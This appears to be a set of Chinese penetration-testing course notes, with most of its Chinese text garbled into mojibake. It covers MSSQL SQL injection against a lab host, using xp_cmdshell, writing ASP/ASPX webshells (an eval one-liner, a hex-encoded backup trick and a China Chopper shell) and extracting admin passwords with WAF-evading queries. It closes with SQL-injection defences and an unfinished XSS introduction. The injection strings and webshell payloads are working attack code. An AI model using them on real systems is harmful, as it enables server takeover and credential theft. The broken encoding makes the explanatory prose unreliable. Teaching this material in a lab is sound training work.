æ³¨å…¥æŒ‡ä»¤: and 1=(SELECT IS_MEMBER(db_owner));-- ## æœ‰æƒé™å°±æ˜¯1ï¼Œæ²¡æœ‰å°±æ˜¯0## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20and%201=(SELECT%20IS_MEMBER(%27db_owner%27));-- æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç½‘ç«™è·¯å¾„ï¼Œå°±æ˜¯ä¸‹é¢è¿™ä¸ªï¼š C:\\www\\iisaspx\\sqlserver 2-2 æŸ¥æ‰¾ä»£ç è·¯å¾„2-1 ç½‘é¡µæŠ¥é”™1.é€šè¿‡æŠ¥é”™æˆ–è€…baiduã€googleç­‰æŸ¥æ‰¾ï¼Œä¸è¿‡è¿˜æ˜¯é€šè¿‡æ‰«æå·¥å…·æ¥çš„å¿«ä¸€äº›ã€‚ 2-2 æœç´¢baiduæˆ–è€…googleç­‰ï¼Œé€šè¿‡site:xxx.comç­‰æ¥æŸ¥æ‰¾ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæŠ¥é”™çš„é¡µé¢æˆ–è€…æ•æ„Ÿç½‘é¡µè·¯å¾„ä¿¡æ¯ä¹‹ç±»çš„ 2-3 æ‰«æå·¥å…·æˆ‘ä»¬ç”¨è¿‡çš„7kbã€ ç©¿å±±ç”²ä»€ä¹ˆçš„ã€‚ 2.é€šè¿‡ç›¸å…³è¯­å¥æŸ¥æ‰¾ï¼Œä½†æ˜¯ä¹Ÿéœ€è¦ä¸€ä¸ªæ¡ä»¶ï¼Œéœ€è¦å¯¹æ–¹å¼€å¯äº†xp_cmdshell 1. ;drop table black;create Table black(result varchar(7996) null, id int not null identity (1,1))-- # blackæ˜¯éšä¾¿å†™çš„ä¸€ä¸ªåº“åæ˜‚ï¼Œåªè¦åˆ«å’Œäººå®¶ç½‘ç«™ç°æœ‰çš„åº“é‡åå°±è¡Œï¼Œæˆ‘ç»å¸¸ç”¨è¿™ä¸ªblackåå­—ï¼Œæ‰€ä»¥æˆ‘å…ˆæ‰§è¡Œäº†ä¸€ä¸‹åˆ é™¤blackè¡¨ï¼Œç„¶åå†åˆ›å»ºçš„blackè¡¨2. ;insert into black exec master..xp_cmdshell dir /s c:\\1.aspx-- # å¾€blackè¡¨ä¸­æ’å…¥dir /s c:\\1.aspxè¿™ä¸ªç³»ç»ŸæŒ‡ä»¤çš„æ‰§è¡Œç»“æœ3. and (select result from black where id=4)0-- # æŸ¥æ‰¾blackè¡¨ä¸­çš„æ•°æ® 2.1 åˆ›å»ºblackè¡¨ ## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20drop%20table%20black;create%20Table%20black(result%20varchar(7996)%20null,%20id%20int%20not%20null%20identity%20(1,1))-- çœ‹æ•°æ®åº“ä¸­æ˜¯å¦åˆ›å»ºäº†blackè¡¨ ç‚¹å‡»è®¾è®¡ï¼Œèƒ½çœ‹åˆ°è¡¨ç»“æ„ è¯´æ˜è¡¨åˆ›å»ºå¥½äº†ã€‚ 2.2 æ’å…¥æ•°æ® å…ˆæŸ¥çœ‹ä¸€ä¸‹1.aspxæ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªæŒ‡ä»¤çš„æ‰§è¡Œæ•ˆæœï¼š dir s c:\\1.aspx ## æ³¨å…¥ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20insert%20into%20black%20exec%20master..xp_cmdshell%20%27dir%20/s%20c:\\1.aspx%27-- æ•ˆæœï¼š æŸ¥çœ‹è¡¨ä¸­çš„æ•°æ®ï¼š æ•°æ®åº“ä¸­æœ‰æ•°æ®äº†ï¼Œæ¥ä¸‹æ¥é€šè¿‡æ³¨å…¥çš„æ–¹å¼æ¥è·å–è·¯å¾„ï¼Œè¿˜æ˜¯é€šè¿‡æŠ¥é”™ä¿¡æ¯æ¥æŸ¥çœ‹ ## æ³¨å…¥æŒ‡ä»¤ï¼š and (select result from black where id=4)0--## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20and%20(select%20result%20from%20black%20where%20id=4)%3E0--## ä½†æ˜¯è¦æ³¨æ„ï¼šç”¨ä½ç‰ˆæœ¬çš„æµè§ˆå™¨ï¼Œä¸ç„¶æŠ¥é”™ä¿¡æ¯çœ‹ä¸åˆ°è·¯å¾„çš„ çœ‹åˆ°äº†è·¯å¾„ï¼Œå¾—åˆ°è·¯å¾„ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æäº‹æƒ…äº†ï¼Œæ¯”å¦‚ä¸Šä¼ ä¸ªæœ¨é©¬è„šæœ¬ä»€ä¹ˆçš„ 2-3 ä¸€å¥è¯æœ¨é©¬æ‹¿åˆ°webshellé€šè¿‡æ³¨å…¥è¯­å¥æ¥æï¼šæ¯”è¾ƒéº»çƒ¦ä¸€äº› master..xp_cmd %20;exec%20master..xp_cmdshell%20Echo%20%eval%20request(jaden)%%20%20c:\\www\\wwwroot\\sqlserver\\muma.asp-- å·®å¼‚å¤‡ä»½ ;alter database testdb set RECOVERY FULL;create table test_tmp(str image);backup log testdb to disk=c:\\test1 with init;insert into test_tmp(str) values(0x3C2565786375746528726571756573742822636D64222929253E);backup log testdb todisk=c:\\www\\iisaspx\\yjh.asp;alter database testdb set RECOVERY simple é€šè¿‡å·¥å…·æ¥æï¼šæ¯”è¾ƒç®€å•ä¸€äº› å…ˆæ‰¾åˆ°èœåˆ€ï¼Œå°†èœåˆ€ä¸­çš„ä¸€å¥è¯æœ¨é©¬æ‹¿å‡ºæ¥ æ–‡ä»¶å†…å®¹å¦‚ä¸‹ æˆ‘å°†ä»£ç æ”¾åˆ°ä¸‹é¢äº†ï¼š %@ Page Language=Jscript%%eval(Request.Item[123],unsafe);% #æ³¨æ„ï¼šæˆ‘å°†Itemä¸­çš„chopperæ”¹ä¸ºäº†123ï¼Œè¿™æ˜¯ä¸ªå¯†ç  å¥½ï¼Œç„¶åæ‰“å¼€GetWebShellå·¥å…·ï¼Œå…¶ä¸­å¤‡ä»½è·¯å¾„çš„è¿™ä¸ªæ–‡ä»¶æ˜¯æ•°æ®åº“æ•°æ®å’Œæœ¨é©¬ç¨‹åºï¼Œéƒ½å†™åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­äº†ã€‚ å›åˆ°é¶æœºwin2003ç”µè„‘ä¸Šï¼ŒæŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œ777.aspxå°±æœ‰äº† æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œæœç´¢123ï¼Œèƒ½å¤Ÿçœ‹åˆ°æˆ‘ä»¬çš„æœ¨é©¬å·²ç»å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶é‡Œé¢äº† æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ‰“å¼€èœåˆ€å·¥å…·ï¼Œå°†777.aspxç½‘å€æ·»åŠ åˆ°èœåˆ€ä¸­ ç‚¹å‡»æ·»åŠ åï¼Œå¼¹å‡ºå¦‚ä¸‹çª—å£ å¦‚ä¸‹ï¼Œè¿™é‡Œä¸å¯¹ï¼Œå‡ºç°é”™è¯¯äº†ã€‚ ä¹‹å‰åœ¨çœŸå®ç¯å¢ƒä¸‹ä½¿ç”¨çš„æ—¶å€™ï¼Œæ˜¯æ²¡é—®é¢˜çš„ï¼Œè¿™é‡Œè¿™ä¸ªæœ¨é©¬ç¨‹åºå¥½åƒæ²¡æœ‰è¿æ¥ä¸Šï¼Œæˆ‘ä»¬æ¢ä¸€ä¸ªæœ¨é©¬ç¨‹åºå†è¯•è¯• getwebshellï¼š é¶æœºä¸Šæ–‡ä»¶æœ‰äº† å†é€šè¿‡èœåˆ€æ¥æ‰§è¡Œè¿™ä¸ªæœ¨é©¬ .\\typora-user-images ä½†æ˜¯è¿˜æ˜¯æŠ¥é”™äº†ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬è™šæ‹Ÿæœºé¶æœºçš„é—®é¢˜ï¼Œå› ä¸ºä¸Šä¼ ä¸€å¥æœ¨é©¬çš„æµç¨‹æ˜¯okçš„ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹getwebshellå·¥å…·ï¼Œå®ƒè¿˜èƒ½é€šè¿‡æ³¨å…¥ç‚¹ï¼Œæ·»åŠ ç”¨æˆ·ï¼Œå¼€æœºè‡ªåŠ¨æ·»åŠ ï¼Œè¿™é‡Œéœ€è¦è¿™ä¸ªç½‘å€ä¸­çš„1.aspxæ–‡ä»¶çš„æƒé™ä¸ºç®¡ç†å‘˜æƒé™æ‰è¡Œã€‚ çœ‹é¶æœºæ•ˆæœï¼š ä¸‹è½½å¹¶æ‰§è¡Œæœ¨é©¬ï¼Œå¼€å¯è‡ªåŠ¨å¯åŠ¨æœ¨é©¬ç¨‹åºï¼Œè¿™ä¸ªæˆ‘ä»¬å°±ä¸ç©äº†ã€‚ è¿˜å¯ä»¥ç•™åé—¨ï¼šè¿™ä¸ªæˆ‘ä»¬ä¹Ÿä¸ç©äº† 10-3 publicæƒé™æ³¨å…¥é€šè¿‡è¿™ç§æƒé™ç™»å½•çš„ç”¨æˆ·æ˜¯æ‹¿ä¸åˆ°webshellå’Œç³»ç»Ÿæ‰§è¡ŒæŒ‡ä»¤æƒé™çš„ï¼Œå±äºæœ€ä½æƒé™ï¼Œä½†æ˜¯å¯ä»¥å–åˆ°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ‹–åº“ä»€ä¹ˆçš„éƒ½å¯ä»¥ï¼Œåªè¦å‘ç°æ³¨å…¥ç‚¹ï¼ŒåŸºæœ¬éƒ½å¯ä»¥æ‹–åº“ï¼Œä½†æ˜¯èƒ½ä¸èƒ½æ‹¿åˆ°æ“ä½œç³»ç»Ÿæƒé™ï¼Œè¿™ä¸ªè¦çœ‹å½“å‰æ•°æ®åº“ç”¨æˆ·çš„æƒé™äº†ã€‚ 3-1 è·å–å½“å‰æ•°æ®åº“å## æŒ‡ä»¤ï¼š and db_name()=0--## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20and%20db_name()=0-- 3-2 è·å–mssqlæ‰€æœ‰æ•°æ®åº“ååº“å and 1=(select db_name()) --+and 1=(select db_name(1)) --+and 1=(select db_name(2)) --+ 3-3 è·å–å½“å‰æ•°æ®åº“æ‰€æœ‰è¡¨åselect top 1 name from å½“å‰æ•°æ®åº“.sys.all_objects where type=U AND is_ms_shipped=0 and name not in (select top i name from å½“å‰æ•°æ®åº“.sys.all_objects where type=U AND is_ms_shipped=0) ## ä¿®æ”¹içš„å€¼æ¥æŸ¥çœ‹## æ¯”å¦‚ï¼š and (select top 1 name from testdb.sys.all_objects where type=U AND is_ms_shipped=0 and name not in (select top 0 name from testdb.sys.all_objects where type=U AND is_ms_shipped=0))0 3-4 è·å–è¡¨åå’Œå­—æ®µå## ç¬¬ä¸€ä¸ªæŒ‡ä»¤ï¼š having 1=1--## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20having%201=1-- æ•ˆæœï¼šè¡¨åå’Œidå­—æ®µå ## å°†ç¬¬ä¸€ä¸ªæŒ‡ä»¤çš„ç»“æœå¸¦å…¥åˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤## ç¬¬äºŒä¸ªæŒ‡ä»¤ï¼š group by admin.id having 1=1--## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20group%20by%20admin.id%20having%201=1--## æ•ˆæœï¼šnameå­—æ®µåä¹Ÿçœ‹åˆ°äº† ## ç¬¬ä¸‰ä¸ªæŒ‡ä»¤ï¼š group by admin.id,admin.name having 1=1--## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20group%20by%20admin.id,admin.name%20having%201=1--## æ•ˆæœï¼šå¯†ç å­—æ®µåä¹Ÿçœ‹åˆ°äº† å¦‚æ­¤å¾€å¤å°±èƒ½çœ‹åˆ°æ‰€æœ‰adminè¡¨ä¸­çš„å­—æ®µã€‚ 3-5 è·å–å­—æ®µå†…å®¹## æŒ‡ä»¤ï¼š /**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char (32))%2bchar(94)%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))%3E0/**/and/**/1=1## è¿™ä¸ªæŒ‡ä»¤æ¯”è¾ƒå¤æ‚ä¸€äº›ï¼Œå…¶ä¸­/**/æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„å«ä¹‰ï¼Œå°±å’Œä¸€ä¸ªç©ºæ ¼ä¼¼çš„ï¼Œåƒä¸€ä¸ªå¹²æ‰°ç¬¦å·ï¼Œæ—©æœŸæ˜¯ä¸ºäº†é€šè¿‡wafç”¨çš„ï¼ŒæŠŠè¿™ä¸ªè¯­å¥é‡Œé¢çš„åº“åã€è¡¨åã€å­—æ®µåæ›¿æ¢æˆä½ è‡ªå·±å‘ç°çš„å°±è¡Œäº†## ç½‘å€ï¼š http://192.168.0.25:82/sqlserver/1.aspx?xxser=1%20/**/and/**/(select/**/top/**/1/**/isnull(cast([id]/**/as/**/nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([name]/**/as/**/nvarchar(4000)),char(32))%2bchar(94)%2bisnull(cast([password]/**/as/**/nvarchar(4000)),char(32))/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/and/**/id/**/not/**/in/**/(select/**/top/**/0/**/id/**/from/**/[testdb]..[admin]/**/where/**/1=1/**/group/**/by/**/id))%3E0/**/and/**/1=1 è¿˜æ˜¯å‘ç°ï¼Œæ‰‹å·¥æ¥å†™æ³¨å…¥è¯­å¥ï¼Œå¤ªç¹çäº†ï¼Œé€šè¿‡å·¥å…·è·‘ï¼Œç®€å•ä¸€äº›ï¼Œæ¯”å¦‚ç©¿å±±ç”²ã€sqlmapç­‰,çœ‹ä¸€ä¸‹ç©¿å±±ç”²çš„æ•ˆæœï¼šä¸è¿‡æœ‰æ—¶å€™å¯èƒ½è·‘ä¸å‡ºæ¥æ˜‚ï¼Œå·¥å…·å°±è¿™æ ·ã€‚ 11,mysqlç‰ˆæœ¬åŒºåˆ«## mysql5.0ä»¥åŠ5.0ä»¥ä¸Šçš„ç‰ˆæœ¬éƒ½å­˜åœ¨ä¸€ä¸ªç³»ç»Ÿè‡ªå¸¦çš„ç³»ç»Ÿæ•°æ®åº“ï¼Œå«åšï¼šinformation_schemaï¼Œ## mysql5.0ä»¥ä¸‹æ²¡æœ‰information_schemaåº“ï¼Œåªèƒ½é€šè¿‡æš´åŠ›çŒœè§£çš„æ–¹å¼æ¥è·å–æ•°æ®ï¼Œinformation_schemaåº“é‡Œé¢åŒ…å«äº†å¾ˆå¤šè¡¨ï¼Œå…¶ä¸­è¿™å‡ å¼ è¡¨ï¼šschemataã€tablesã€columnsï¼Œè¿™ä¸‰å¼ è¡¨ä¾æ¬¡åˆ†åˆ«å­˜æ”¾ç€å­—æ®µï¼š(schema_name-åº“å)ã€(table_name-è¡¨åã€table_schema-åº“å)ã€(table_schema-åº“åã€table_name-è¡¨åã€column_name-å­—æ®µå)ï¼Œå…¶æ¬¡å°±æ˜¯5.0ä»¥ä¸Šéƒ½æ˜¯å¤šç”¨æˆ·å¤šæ“ä½œï¼Œ5.0ä»¥ä¸‹æ˜¯å¤šç”¨æˆ·å•æ“ä½œã€‚## mysql5.7å’Œmysql8çš„åŒºåˆ«ï¼š å…ˆä½œä¸ºäº†è§£ã€‚## åˆ›å»ºç”¨æˆ·å’Œæˆæƒï¼š ## mysql5.7å¯ä»¥ä¸€å¥è¯æå®šï¼š grant all privileges on *.* user@% identified by 123456; ## mysql8å¿…é¡»åˆ†å¼€åšï¼š create user user@% identified by 123456; grant all privileges on *.* to user@%; ## tableå‡½æ•° ## tableå‡½æ•°ä¸ºMYSQL8ç‰ˆæœ¬ä¸­æ–°å¢çš„å‡½æ•°ï¼Œå…¶ä½œç”¨ä¸selectç±»ä¼¼ã€‚ table users; ç­‰åŒäºï¼šselect * from users; ## ä½†æ˜¯tableæŸ¥è¯¢æ—¶ï¼Œæ˜¾ç¤ºçš„å§‹ç»ˆæ˜¯è¡¨çš„æ‰€æœ‰åˆ—ï¼Œè€Œä¸”ä¸å¯ä»¥ç”¨whereå­—å¥æ¥é™å®šæŸä¸ªç‰¹å®šçš„è¡Œã€‚valueså‡½æ•°ï¼š select * from user union VALUES ROW(2,3); ## ç­‰åŒäº select * from user union select 2,3; è¿™äº›è¦è®°ä¸‹æ¥ï¼Œæ³¨å…¥çš„æ—¶å€™ä¸»è¦æ‰¾çš„å°±æ˜¯è¿™ä¸‰ä¸ªè¡¨ï¼Œè¿™å‡ ä¸ªå­—æ®µ 12,SQLæ³¨å…¥é˜²æŠ¤æ‰€æœ‰çš„æ•°æ®åº“é˜²æŠ¤æ‰‹æ®µåŸºæœ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®åšä¸¥æ ¼çš„è¿‡æ»¤ã€‚ æ–¹å¼ ## 1ã€å¯¹æäº¤çš„æ•°æ®è¿›è¡Œæ•°æ®ç±»å‹åˆ¤æ–­ï¼Œæ¯”å¦‚idå€¼å¿…é¡»æ˜¯æ•°å­—ï¼šis_numeric( $id )## 2ã€å¯¹æäº¤çš„æ•°æ®è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œç¦æ­¢å‡ºç°æ³¨å…¥è¯­å¥ï¼Œæ¯”å¦‚unionã€orã€andç­‰## 3ã€å¯¹æäº¤æ•°æ®è¿›è¡Œç‰¹æ®Šç¬¦å·è½¬ä¹‰ï¼Œæ¯”å¦‚å•å¼•å·ã€åŒå¼•å·ç­‰ï¼Œç”¨addslashsç­‰å‡½æ•°åŠ å·¥ä¸€ä¸‹## 4ã€ä¸ä½¿ç”¨sqlè¯­å¥æ‹¼æ¥å‚æ•°çš„æ–¹å¼æ¥æ‰§è¡Œsqlè¯­å¥ï¼Œè€Œæ˜¯ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼Œä¹Ÿå«åšå‚æ•°ç»‘å®šçš„æ–¹å¼ï¼Œå¯¹æäº¤çš„å‚æ•°è¿›è¡Œé¢„ç¼–è¯‘ç„¶åè¿›è¡Œå‚æ•°ç»‘å®šï¼Œè¿™æ ·ä¼šå°†ç”¨æˆ·æäº¤çš„æ³¨å…¥è¯­å¥ä½œä¸ºå‚æ•°å€¼æ¥å¤„ç†ï¼Œè€Œä¸æ˜¯å½“ä½œsqlè¯­å¥æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆçš„æ–¹æ³•sqlæ³¨å…¥ï¼šä¸åŒè¯­è¨€çš„å†™æ³•ä¸åŒï¼Œä½†æ˜¯åŸç†ç›¸åŒã€‚ $data = $db-prepare( SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1; ); $data-bindParam( :id, $id, PDO::PARAM_INT ); $data-execute(); ## ä½†æ˜¯é¢„ç¼–è¯‘ä¹Ÿä¸èƒ½å®Œå…¨è§£å†³sqlæ³¨å…¥é—®é¢˜ï¼Œæ¯”å¦‚å¦‚æœæŸ¥è¯¢è¯­å¥ä¸­è¡¨åæ˜¯åŠ¨æ€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¡¨åä¹Ÿæ˜¯ç”¨æˆ·å¯ä»¥æäº¤è¿‡æ¥çš„æ•°æ®ï¼Œæ ¹æ®ç”¨æˆ·æäº¤çš„è¡¨åæ¥è¿›è¡Œä¸åŒè¡¨æ•°æ®çš„æŸ¥è¯¢ï¼Œé‚£ä¹ˆä¹Ÿä¼šå‡ºç°sqlæ³¨å…¥æ¼æ´ï¼Œå› ä¸ºè¡¨åä¸èƒ½è¿›è¡Œé¢„ç¼–è¯‘åŠå‚æ•°ç»‘å®šï¼Œä¸‹é¢å°±æŠ¥é”™ $table_name=jaden; $data = $db-prepare( SELECT first_name, last_name FROM (:table_name) WHERE user_id = (:id) LIMIT 1; ); ## è¿™ç§å°±éœ€è¦é…åˆç™½åå•è¿›è¡Œè¿‡æ»¤ï¼š if ($table_name == jaden) $data = $db-prepare( SELECT first_name, last_name FROM jaden WHERE user_id = (:id) LIMIT 1; ); elif ($table_name == wulaoban) $data = $db-prepare( SELECT first_name, last_name FROM wulaoban WHERE user_id = (:id) LIMIT 1; ); else echo åˆ«ä¹±æï¼; ## 5ã€åˆ†çº§ç®¡ç†ï¼šç”¨æˆ·çš„æƒé™è¦è¿›è¡Œä¸¥æ ¼æ§åˆ¶å’Œåˆ’åˆ†ï¼ŒæœåŠ¡ç«¯ä»£ç è¿æ¥æ•°æ®åº“ä½¿ç”¨çš„ç”¨æˆ·ç¦æ­¢ä½¿ç”¨rootç­‰é«˜æƒé™ç”¨æˆ·ã€‚æ¯”å¦‚å¯¹ç”¨æˆ·è¿›è¡Œåˆ†çº§ç®¡ç†ï¼Œä¸¥æ ¼æ§åˆ¶ç”¨æˆ·çš„æƒé™ï¼Œå¯¹äºæ™®é€šç”¨æˆ·ï¼Œç¦æ­¢ç»™äºˆæ•°æ®åº“å»ºç«‹ã€åˆ é™¤ã€ä¿®æ”¹ç­‰ç›¸å…³æƒé™ï¼Œåªæœ‰ç³»ç»Ÿç®¡ç†å‘˜æ‰å…·æœ‰å¢ã€åˆ ã€æ”¹ã€æŸ¥çš„æƒé™ç­‰ç­‰ã€‚6ã€æ•°æ®åº“ä¸­æ•æ„Ÿçš„æ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·çš„å¯†ç ï¼Œè¦åŠ å¯†å­˜å‚¨ã€‚## æ€»ä½“æ¥è¯´ï¼š ## ï¼ˆ1ï¼‰æ°¸è¿œä¸è¦ä¿¡ä»»ç”¨æˆ·çš„è¾“å…¥ï¼Œè¦å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œæ ¡éªŒï¼Œå¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œæˆ–é™åˆ¶é•¿åº¦ï¼Œå¯¹ç‰¹æ®Šå­—ç¬¦å’Œç¬¦å·è¿›è¡Œè½¬æ¢ç­‰ã€‚ ## ï¼ˆ2ï¼‰æ°¸è¿œä¸è¦ä½¿ç”¨åŠ¨æ€æ‹¼è£…SQLï¼Œå¯ä»¥ä½¿ç”¨å‚æ•°åŒ–çš„SQLæˆ–è€…ç›´æ¥ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹è¿›è¡Œæ•°æ®æŸ¥è¯¢å­˜å–ã€‚ ## ï¼ˆ3ï¼‰æ°¸è¿œä¸è¦ä½¿ç”¨ç®¡ç†å‘˜æƒé™çš„æ•°æ®åº“è¿æ¥ï¼Œä¸ºæ¯ä¸ªåº”ç”¨ä½¿ç”¨å•ç‹¬çš„æƒé™æœ‰é™çš„æ•°æ®åº“è¿æ¥ã€‚ ## ï¼ˆ4ï¼‰ä¸è¦æŠŠæœºå¯†ä¿¡æ¯æ˜æ–‡å­˜æ”¾ï¼Œè¯·åŠ å¯†æˆ–è€…hashæ‰å¯†ç å’Œæ•æ„Ÿçš„ä¿¡æ¯ã€‚ ## ï¼ˆ5ï¼‰åº”ç”¨çš„å¼‚å¸¸ä¿¡æ¯åº”è¯¥ç»™å‡ºå°½å¯èƒ½å°‘çš„æç¤ºï¼Œæœ€å¥½ä½¿ç”¨è‡ªå®šä¹‰çš„é”™è¯¯ä¿¡æ¯å¯¹åŸå§‹é”™è¯¯ä¿¡æ¯è¿›è¡ŒåŒ…è£…ï¼ŒæŠŠå¼‚å¸¸ä¿¡æ¯å­˜æ”¾åœ¨ç‹¬ç«‹çš„è¡¨ä¸­ã€‚ 9-2 xssè·¨è„šæœ¬æ”»å‡»9-2-1 ä»€ä¹ˆæ˜¯xssXSSå…¨ç§°ï¼ˆCross Site Scriptingï¼‰è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œä¸ºäº†é¿å…å’ŒCSSå±‚å æ ·å¼è¡¨åç§°å†²çªï¼Œæ‰€ä»¥æ”¹ä¸ºäº†XSSï¼Œæ˜¯æœ€å¸¸è§çš„Webåº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ä¹‹ä¸€ï¼Œä½äºOWASP top 10 20132017å¹´åº¦åˆ†åˆ«ä¸ºç¬¬sä¸‰åå’Œç¬¬ä¸ƒåï¼ŒXSSæ˜¯æŒ‡æ”»å‡»è€…åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯è„šæœ¬ï¼Œé€šå¸¸æ˜¯JavaScriptç¼–å†™çš„å±é™©ä»£ç ï¼Œå½“ç”¨æˆ·ä½¿ç”¨æµè§ˆå™¨æµè§ˆç½‘é¡µæ—¶ï¼Œè„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šæ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„ã€‚ ## OWASPï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰æ˜¯ä¸€ä¸ªå¼€æ”¾çš„ç¤¾åŒºï¼Œç”±éè¥åˆ©ç»„ç»‡ OWASPåŸºé‡‘ä¼šæ”¯æŒçš„é¡¹ç›®ã€‚å¯¹æ‰€æœ‰è‡´åŠ›äºæ”¹è¿›åº”ç”¨ç¨‹åºå®‰å…¨çš„äººå£«å¼€æ”¾ï¼Œæ—¨åœ¨æé«˜å¯¹åº”ç”¨ç¨‹åºå®‰å…¨æ€§çš„è®¤è¯†ã€‚å…¶æœ€å…·æƒå¨çš„å°±æ˜¯10é¡¹æœ€ä¸¥é‡çš„Web åº”ç”¨ç¨‹åºå®‰å…¨é£é™©åˆ—è¡¨ï¼Œæ€»ç»“å¹¶æ›´æ–°Webåº”ç”¨ç¨‹åºä¸­æœ€å¯èƒ½ã€æœ€å¸¸è§ã€æœ€å±é™©çš„åå¤§æ¼æ´ï¼Œæ˜¯å¼€å‘ã€æµ‹è¯•ã€æœåŠ¡ã€å’¨è¯¢äººå‘˜åº”çŸ¥åº”ä¼šçš„çŸ¥è¯†ã€‚ ä»ä¸Šé¢ä¸­çš„ä¸€æ®µè¯ï¼Œå¯ä»¥å¾—çŸ¥ï¼ŒXSSå±äºå®¢æˆ·ç«¯æ”»å‡»ï¼Œå—å®³è€…æœ€ç»ˆæ˜¯ç”¨æˆ·ï¼Œä½†ç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯ç½‘ç«™ç®¡ç†äººå‘˜ä¹Ÿå±äºç”¨æˆ·ä¹‹ä¸€ã€‚è¿™å°±æ„å‘³ç€XSSå¯ä»¥è¿›è¡Œâ€æœåŠ¡ç«¯â€æ”»å‡»ï¼Œå› ä¸ºç®¡ç†å‘˜è¦æ¯”æ™®é€šç”¨æˆ·çš„æƒé™å¤§å¾—å¤šï¼Œä¸€èˆ¬ç®¡ç†å‘˜éƒ½å¯ä»¥å¯¹ç½‘ç«™è¿›è¡Œæ–‡ä»¶ç®¡ç†ï¼Œæ•°æ®ç®¡ç†ç­‰æ“ä½œï¼Œè€Œæ”»å‡»è€…ä¸€èˆ¬ä¹Ÿæ˜¯é ç®¡ç†å‘˜èº«ä»½ä½œä¸ºâ€œè·³æ¿â€è¿›è¡Œå®æ–½æ”»å‡»ã€‚ XSSæ”»å‡»æœ€ç»ˆç›®çš„æ˜¯åœ¨ç½‘é¡µä¸­åµŒå…¥å®¢æˆ·ç«¯æ¶æ„è„šæœ¬ä»£ç ï¼Œæœ€å¸¸ç”¨çš„æ”»å‡»ä»£ç æ˜¯javascriptè¯­è¨€ï¼Œä½†ä¹Ÿä¼šä½¿ç”¨å…¶å®ƒçš„è„šæœ¬è¯­è¨€ï¼Œä¾‹å¦‚ï¼šActionScriptã€VBscriptã€‚è€Œå¦‚ä»Šçš„äº’è”ç½‘å®¢æˆ·ç«¯è„šæœ¬åŸºæœ¬æ˜¯åŸºäºJavascript,æ‰€ä»¥å¦‚æœæƒ³è¦æ·±å…¥ç ”ç©¶XSSï¼Œå¿…é¡»è¦ç²¾é€šJavascriptã€‚ å¤§è‡´å›¾è§£ï¼š 9-2-2 xssæ¼æ´å‡ºç°çš„åŸå› ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºçš„æ§åˆ¶ä¸å¤Ÿä¸¥æ ¼,å¯¼è‡´â€ç²¾å¿ƒæ„é€ â€çš„è„šæœ¬è¾“å…¥å,åœ¨è¾“å‡ºåˆ°å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³. 9-2-3 xssçš„å±å®³1ã€é¦–å…ˆå¯¹äºé‚£äº›åŠå¹´æ²¡æœ‰æ›´æ–°çš„å°ä¼ä¸šç½‘ç«™æ¥è¯´ï¼Œå‘ç”ŸXSSæ¼æ´å‡ 